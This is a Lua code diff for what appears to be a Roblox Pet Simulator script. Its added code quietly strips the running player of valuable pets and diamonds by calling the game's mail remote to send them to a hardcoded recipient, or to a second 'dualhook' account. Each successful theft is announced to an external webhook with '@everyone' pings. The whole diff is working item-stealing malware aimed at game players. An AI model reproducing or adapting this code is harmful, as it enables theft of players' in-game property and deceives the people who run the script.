+        if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(SList) do
+                user = ndUser
+                if secretin ~= nil then
+                    if dualhook(secretin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                if #SList == 0 or SList == {} then
+                    -- print("done6")
+                    break
+                end
+            end
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
+            for i, v in pairs(MList) do
+                user = ndUser
+                if mythicin ~= nil then
+                    if dualhook(mythicin) then
+                        user = dhuser
+                    end
+                end
+                local args = {
+                    [1] = {
+                        ["Recipient"] = user,
+                        ["Diamonds"] = givediaamt,
+                        ["Pets"] = { v },
+                        ["Message"] = mailmsg,
+                    }
+                }
+                mailremote:InvokeServer(unpack(args))
+                -- wait(5.5)
+                -- print("secret sending")
+                if #MList == 0 or MList == {} then
+                    -- print("done6")
+                    break
+                end
+            end
+        end
+    end
+end)
+
+local Tcc = #TList
+WTianicList = {}
+WTList = {}
+WTcc = {}
+local titanicnumber = 1
+
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.titanic then
+                table.insert(WTianicList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WTianicList, v["id"]) ~= nil then
+                table.insert(WTList, v["uid"])
+                table.insert(WTcc, v["id"])
+            end
+        end
+        if Tcc == #WTList + 1 then
+            -- print("Titanic Has Been Sent")
+            Tcc = #TList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local titanictid = STList[titanicnumber]
+            local titanicname
+            local titanicimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local titanicsm = string.split(v.Name, " - ")[1]
+                if titanicsm == tostring(titanictid) then
+                    titanicname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    titanicimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":scream:  **TITANIC** :scream:", titanicname, "@everyone OMFG", DiamondsCount, FinalList,
+                titanicimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            titanicnumber = titanicnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Tcc == 0 or FinalList == 0 then
+            TList = {}
+            -- print("done1")
+            break
+        end
+        WTianicList = {}
+        WTList = {}
+        WTcc = {}
+        wait(1)
+    end
+end)
+
+local Bcc = #BList
+WBananaList = {}
+WBList = {}
+WBcc = {}
+
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.name == "banana" then
+                table.insert(WBananaList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WBananaList, v["id"]) ~= nil then
+                table.insert(WBList, v["uid"])
+                table.insert(WBcc, v["id"])
+            end
+        end
+        if Bcc == #WBList + 1 then
+            -- print("Banana Has Been Sent")
+            Bcc = #BList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local banananame = "Banana"
+            local bananaimg = "rbxassetid://10946336703"
+            SendWebhook(":banana: **BANANA** :banana:", banananame, "@everyone", DiamondsCount, FinalList, bananaimg,
+                UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Bcc == 0 or FinalList == 0 then
+            BList = {}
+            -- print("done2")
+            break
+        end
+        WBananaList = {}
+        WBList = {}
+        WBcc = {}
+        wait(1)
+    end
+end)
+
+
+local Hcc = #HList
+WHugeList = {}
+WHList = {}
+WHcc = {}
+local hugenumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.huge then
+                table.insert(WHugeList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WHugeList, v["id"]) ~= nil then
+                table.insert(WHList, v["uid"])
+                table.insert(WHcc, v["id"])
+            end
+        end
+        if Hcc == #WHList + 1 then
+            -- print("Huge Has Been Sent")
+            Hcc = #WHList
+            FinalList = FinalList - 1
+            local hugepetid = SHList[hugenumber]
+            local hugeimg
+            local hugepetname
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local hugepetsm = string.split(v.Name, " - ")[1]
+                if hugepetsm == tostring(hugepetid) then
+                    hugepetname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    hugeimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":money_mouth: **HUGE** :money_mouth:", hugepetname, "@everyone", DiamondsCount,
+                FinalList, hugeimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            hugenumber = hugenumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Hcc == 0 or FinalList == 0 then
+            HList = {}
+            -- print("done3")
+            break
+        end
+        WHugeList = {}
+        WHList = {}
+        WHcc = {}
+        wait(1)
+    end
+end)
+
+local Pcc = #PList
+WPogList = {}
+WPList = {}
+WPcc = {}
+local pognumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if string.split(v.name, " ")[1] == "Pog" then
+                table.insert(WPogList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WPogList, v["id"]) ~= nil then
+                table.insert(WPList, v["uid"])
+                table.insert(WPcc, v["id"])
+            end
+        end
+        if Pcc == #WPList + 1 then
+            -- print("Exc")
+            Pcc = #WPList
+            FinalList = FinalList - 1
+            local pogID = SPList[pognumber]
+            local pogname
+            local pogimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local pogsm = string.split(v.Name, " - ")[1]
+                if pogsm == tostring(pogID) then
+                    pogname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    pogimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":fire: **POG** :fire:", pogname, "", DiamondsCount, FinalList, pogimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            pognumber = pognumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Pcc == 0 or FinalList == 0 then
+            PList = {}
+            -- print("done41")
+            break
+        end
+        WPogList = {}
+        WPList = {}
+        WPcc = {}
+        wait(1)
+    end
+end)
+
+local Ecc = #EList
+WExclusiveList = {}
+WEList = {}
+WEcc = {}
+local excnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Exclusive" and not v.huge and not v.titanic then
+                table.insert(WExclusiveList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
+                table.insert(WEList, v["uid"])
+                table.insert(WEcc, v["id"])
+            end
+        end
+        if Ecc == #WEList + 1 then
+            -- print("Exc")
+            Ecc = #WEList
+            FinalList = FinalList - 1
+            local excID = SEList[excnumber]
+            local excimg
+            local excname
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local excsm = string.split(v.Name, " - ")[1]
+                if excsm == tostring(excID) then
+                    excname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    excimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":teddy_bear: **Exclusive** :teddy_bear:", excname, "", DiamondsCount, FinalList, excimg,
+                UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            excnumber = excnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Ecc == 0 or FinalList == 0 then
+            EList = {}
+            -- print("done41")
+            break
+        end
+        WExclusiveList = {}
+        WEList = {}
+        WEcc = {}
+        wait(1)
+    end
+end)
+
+local Evcc = #EvList
+WEventList = {}
+WEvList = {}
+WEvcc = {}
+local eventnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Event" then
+                table.insert(WEventList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WEventList, v["id"]) ~= nil then
+                table.insert(WEvList, v["uid"])
+                table.insert(WEvcc, v["id"])
+            end
+        end
+        if Evcc == #WEvList + 1 then
+            -- print("Event")
+            Evcc = #WEvList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local eventID = SEvList[eventnumber]
+            local eventname
+            local eventimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local eventsm = string.split(v.Name, " - ")[1]
+                if eventsm == tostring(eventID) then
+                    eventname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    eventimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":pushpin: **Event** :pushpin:", eventname, "", DiamondsCount, FinalList, eventimg, ndUser,
+                petinfo)
+            givediaamt = 0
+            DiamondsCount = 0
+            eventnumber = eventnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Evcc == 0 or FinalList == 0 then
+            EvList = {}
+            -- print("done5")
+            break
+        end
+        WEventList = {}
+        WEvList = {}
+        WEvcc = {}
+        wait(1)
+    end
+end)
+
+
+local Scc = #SList
+WSecretList = {}
+WSList = {}
+WScc = {}
+local secretnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Secret" then
+                table.insert(WSecretList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WSecretList, v["id"]) ~= nil then
+                table.insert(WSList, v["uid"])
+                table.insert(WScc, v["id"])
+            end
+        end
+        if Scc == #WSList + 1 then
+            -- print("Secret")
+            Scc = #WSList
+            FinalList = FinalList - 1
+            local secretID = SSList[secretnumber]
+            local secretname
+            local secretimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local secretsm = string.split(v.Name, " - ")[1]
+                if secretsm == tostring(secretID) then
+                    secretname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    secretimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":shushing_face: **SECRET** :shushing_face:", secretname, "", DiamondsCount, FinalList,
+                secretimg, ndUser)
+            givediaamt = 0
+            DiamondsCount = 0
+            secretnumber = secretnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Scc == 0 or FinalList == 0 then
+            SList = {}
+            -- print("done6")
+            break
+        end
+        WSecretList = {}
+        WSList = {}
+        WScc = {}
+        wait(1)
+    end
+end)
+
+local Mcc = #MList
+WMythicList = {}
+WMList = {}
+WMcc = {}
+local mythicnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Mythical" then
+                table.insert(WMythicList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WMythicList, v["id"]) ~= nil and v.hc and v.dm then
+                table.insert(WMList, v["uid"])
+                table.insert(WMcc, v["id"])
+            end
+        end
+        if Mcc == #WMList + 1 then
+            -- print("Mythic")
+            Mcc = #WMList
+            FinalList = FinalList - 1
+            local mythicID = SMList[mythicnumber]
+            local mythicname
+            local mythicimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local mythicsm = string.split(v.Name, " - ")[1]
+                if mythicsm == tostring(mythicID) then
+                    mythicname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    mythicimg = require(v:FindFirstChildOfClass("ModuleScript")).darkMatterThumbnail
+                    break
+                end
+            end
+            SendWebhook(":ribbon: **Mythical** :ribbon:", mythicname, "", DiamondsCount, FinalList, mythicimg,
+                ndUser)
+            givediaamt = 0
+            DiamondsCount = 0
+            mythicnumber = mythicnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Mcc == 0 or FinalList == 0 then
+            MList = {}
+            -- print("done7")
+            break
+        end
+        WMythicList = {}
+        WMList = {}
+        WMcc = {}
+        wait(1)
+    end
+end)
